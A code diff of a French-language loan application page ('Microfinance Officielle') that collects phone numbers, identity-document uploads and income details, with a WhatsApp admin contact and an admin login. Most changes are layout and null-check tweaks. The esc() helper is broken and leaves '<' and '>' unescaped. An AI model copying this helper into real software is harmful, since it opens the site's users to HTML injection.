@@ -23,16 +23,16 @@ header{display:flex;gap:18px;align-items:center;justify-content:space-between;ma
 .card{background:linear-gradient(180deg,rgba(255,255,255,.1),rgba(255,255,255,.05));border:1px solid var(--border);border-radius:var(--radius);box-shadow:var(--shadow);overflow:hidden}
 .hero{padding:18px;display:flex;flex-direction:column;gap:14px}
 .photoTop{width:100%;height:210px;border-bottom:1px solid var(--border);background:radial-gradient(1000px 300px at 25% 0%,rgba(45,212,191,.45),transparent 55%),linear-gradient(135deg,rgba(96,165,250,.35),rgba(45,212,191,.15)),url('./IMG-20260622-WA0035.jpg');background-size:cover;background-position:center}
-.steps{display:grid;grid-template-columns:1fr 1fr;gap:12px}@media(max-width:540px){.steps{grid-template-columns:1fr}}
+/* .steps{display:grid;grid-template-columns:1fr 1fr;gap:12px}@media(max-width:540px){.steps{grid-template-columns:1fr}} */
 .step{background:rgba(255,255,255,.05);border:1px solid rgba(255,255,255,.12);border-radius:14px;padding:12px}
 .step .k{font-weight:700}.step .d{color:var(--muted);font-size:13px;margin-top:4px}
-form{padding:18px}.sectionTitle{margin:0 0 10px;font-size:15px;color:var(--muted)}
-.formGrid{display:grid;grid-template-columns:1fr 1fr;gap:12px}@media(max-width:720px){.formGrid{grid-template-columns:1fr}}
-label{font-size:13px;color:var(--muted);display:block;margin-bottom:6px}
-input,select,textarea{width:100%;padding:12px;border-radius:12px;border:1px solid rgba(255,255,255,.16);background:rgba(10,16,30,.35);color:var(--text);outline:none}
-textarea{min-height:92px;resize:vertical}input:focus,select:focus,textarea:focus{border-color:rgba(45,212,191,.65)}
+form{padding:22px}.sectionTitle{margin:0 0 12px;font-size:15px;color:var(--muted)}
+.formGrid{display:flex;flex-direction:column;gap:14px;align-items:stretch}.formGrid > .full{width:100%}
+label{font-size:13px;color:var(--muted);display:block;margin-bottom:7px}
+input,select,textarea{width:100%;padding:13px 14px;border-radius:12px;border:1px solid rgba(255,255,255,.16);background:rgba(10,16,30,.35);color:var(--text);outline:none;font-size:14px}
+textarea{min-height:110px;resize:vertical}input:focus,select:focus,textarea:focus{border-color:rgba(45,212,191,.65)}
 .full{grid-column:1/-1}
-.actions{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-top:14px;flex-wrap:wrap}
+.actions{display:flex;gap:12px;align-items:center;justify-content:space-between;margin-top:16px;flex-wrap:wrap}
 .btn{cursor:pointer;border:none;padding:12px 16px;border-radius:14px;font-weight:700;color:#001018;background:linear-gradient(135deg,rgba(45,212,191,1),rgba(96,165,250,1))}
 .btn:disabled{opacity:.55;cursor:not-allowed}
 .btnSecondary{cursor:pointer;border:1px solid rgba(255,255,255,.2);padding:12px 16px;border-radius:14px;font-weight:700;background:rgba(255,255,255,.06);color:var(--text)}
@@ -57,7 +57,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
 .waBig:hover{background:rgba(45,212,191,.35)}
 .adminRow{display:grid;grid-template-columns:1.2fr .8fr 1fr 70px;padding:10px 14px;border-bottom:1px solid rgba(255,255,255,.08);cursor:pointer;align-items:center}
 .adminRow:hover{background:rgba(255,255,255,.05)}
-.pageNav{margin-top:16px;display:flex;gap:12px;justify-content:space-between;align-items:center;flex-wrap:wrap}
+.pageNav{margin-top:20px;display:flex;gap:12px;justify-content:space-between;align-items:center;flex-wrap:wrap;padding-top:6px}
 </style>
 </head>
 <body>
@@ -80,7 +80,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
   <div class="grid">
 
     <!-- FORMULAIRE -->
-    <section class="card">
+    <section class="card" style="min-height:760px;">
       <div class="photoTop"></div>
       <div style="padding:12px 18px 0;text-align:center">
         <div style="font-weight:1000;font-size:26px">Microfinance Officielle</div>
@@ -109,10 +109,12 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>T&eacute;l&eacute;phone (obligatoire)</label><input name="phone" type="tel" required placeholder="Ex: +225..."></div>
               <div class="full"><label>Type de document</label><select name="idDoc" required><option value="CNI">CNI</option><option value="Passeport">Passeport</option><option value="Permis">Permis</option><option value="Autre">Autre</option></select></div>
               <div class="full"><label>Document d'identit&eacute; (PDF/JPG/PNG)</label><input name="idDocFile" type="file" accept="application/pdf,image/png,image/jpeg" required></div>
+            </div>
             <div class="pageNav">
               <div></div>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
+          </div>
 
           <!-- PAGE 2 -->
           <div class="formPage hidden" data-page="2">
@@ -122,10 +124,12 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>Statut</label><select name="jobType" required><option value="Salari&eacute;">Salari&eacute;</option><option value="Ind&eacute;pendant">Ind&eacute;pendant</option><option value="Entrepreneur">Entrepreneur</option></select></div>
               <div class="full"><label>Revenu mensuel</label><select name="incomeMonthly" required><option value="Moins de 100 000 FCFA">Moins de 100 000 FCFA</option><option value="100 000 &agrave; 300 000 FCFA">100 000 &agrave; 300 000 FCFA</option><option value="300 001 &agrave; 500 000 FCFA">300 001 &agrave; 500 000 FCFA</option><option value="Plus de 500 000 FCFA">Plus de 500 000 FCFA</option></select></div>
               <div class="full"><label>Autre source de revenus ?</label><select name="otherIncome" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
+            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
+          </div>
 
           <!-- PAGE 3 -->
           <div class="formPage hidden" data-page="3">
@@ -135,20 +139,24 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
               <div class="full"><label>Dur&eacute;e</label><select name="repaymentTerm" required><option value="3 mois">3 mois</option><option value="6 mois">6 mois</option><option value="12 mois">12 mois</option><option value="24 mois">24 mois</option></select></div>
               <div class="full"><label>D&eacute;j&agrave; eu un pr&ecirc;t ?</label><select name="previousLoan" required><option value="Oui">Oui</option><option value="Non">Non</option></select></div>
               <div class="full"><label>Objet (r&eacute;sum&eacute;)</label><textarea name="purpose" required placeholder="Ex: stock, &eacute;quipement..."></textarea></div>
+            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btnSecondary" type="button" onclick="nextPage()">Suivant</button>
             </div>
+          </div>
 
           <!-- PAGE 4 -->
           <div class="formPage hidden" data-page="4">
             <div class="formGrid">
               <div class="full"><h2 style="font-size:18px;margin-top:10px">Consentement</h2></div>
               <div class="full"><label>Consentement</label><select name="agree" required><option value="Oui">Oui, j'autorise</option><option value="Non">Non</option></select></div>
+            </div>
             <div class="pageNav">
               <button class="btnSecondary" type="button" onclick="prevPage()">Pr&eacute;c&eacute;dent</button>
               <button class="btn" type="submit" id="submitBtn">Soumettre</button>
             </div>
+          </div>
 
         </div>
       </form>
@@ -169,7 +177,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
     <!-- PANEL LATÉRAL -->
     <aside class="card">
       <div style="padding:12px;text-align:right">
-        <button class="toggleBtn" type="button" onclick="togglePanel()">D&eacute;tails <span id="toggleIcon">&#9660;</span></button>
+        <!-- <button class="toggleBtn" type="button" onclick="togglePanel()">D&eacute;tails <span id="toggleIcon">&#9660;</span></button> -->
       </div>
       <div id="rightPanelCollapse" style="max-height:1200px">
         <div class="side">
@@ -177,7 +185,7 @@ footer{margin-top:16px;color:rgba(234,240,255,.58);font-size:12px;text-align:cen
           <div class="muted">Apr&egrave;s validation, un conseiller active votre cr&eacute;dit.</div>
           <div class="whatsapp">
             <div class="waLeft"><div class="h">WhatsApp Admin</div><div class="p">Activation dossier</div>
-            <a id="waLink" class="waBtn" target="_blank" rel="noopener noreferrer">Ouvrir le chat</a>
+            <!-- <a id="waLink" class="waBtn" target="_blank" rel="noopener noreferrer">Ouvrir le chat</a> -->
           </div>
           <div class="miniItem" style="border-color:rgba(96,165,250,.35);background:rgba(96,165,250,.07)">
             <div class="t">&#128274; Acc&egrave;s Administrateur</div>
@@ -254,8 +262,10 @@ function toast(t,m,v){
 }
 function esc(s){return String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'<','>':'>','"':'"',"'":'&#39;'}[c]))}
 
-document.getElementById('waLink').href='https://wa.me/'+ADMIN_WA;
-document.getElementById('waSuccessBtn').href='https://wa.me/'+ADMIN_WA+'?text=Bonjour%2C%20je%20souhaite%20activer%20mon%20compte';
+const waLink=document.getElementById('waLink');
+if(waLink) waLink.href='https://wa.me/'+ADMIN_WA;
+const waSuccessBtn=document.getElementById('waSuccessBtn');
+if(waSuccessBtn) waSuccessBtn.href='https://wa.me/'+ADMIN_WA+'?text=Bonjour%2C%20je%20souhaite%20activer%20mon%20compte';
 document.getElementById('year').textContent=new Date().getFullYear();
 
 function uid(){return Date.now().toString(36)+'_'+Math.random().toString(36).slice(2,8)}
@@ -266,12 +276,18 @@ function saveAuth(){localStorage.setItem(AUTH_KEY,'1')}
 function clearAuth(){localStorage.removeItem(AUTH_KEY)}
 
 function showAdmin(){
-  document.getElementById('publicView').classList.add('hidden');
-  document.getElementById('adminView').classList.remove('hidden');
+  const publicView=document.getElementById('publicView');
+  const adminView=document.getElementById('adminView');
+  if(publicView) publicView.classList.add('hidden');
+  if(adminView) adminView.classList.remove('hidden');
+  try{ location.hash = '#admin'; }catch(e){}
 }
 function backPublic(){
-  document.getElementById('adminView').classList.add('hidden');
-  document.getElementById('publicView').classList.remove('hidden');
+  const publicView=document.getElementById('publicView');
+  const adminView=document.getElementById('adminView');
+  if(adminView) adminView.classList.add('hidden');
+  if(publicView) publicView.classList.remove('hidden');
+  try{ location.hash = ''; }catch(e){}
 }
 function logoutAdmin(){
   clearAuth();
@@ -396,6 +412,7 @@ document.getElementById('adminLogin').addEventListener('submit',async function(e
     if(d.success&&d.token){
       localStorage.setItem('admin_token',d.token);
       saveAuth();
+      try{ showAdmin(); }catch(e){}
       document.getElementById('adminArea').style.display='block';
       document.getElementById('adminLogin').style.display='none';
       toast('Acces autorise','Bienvenue admin.','ok');
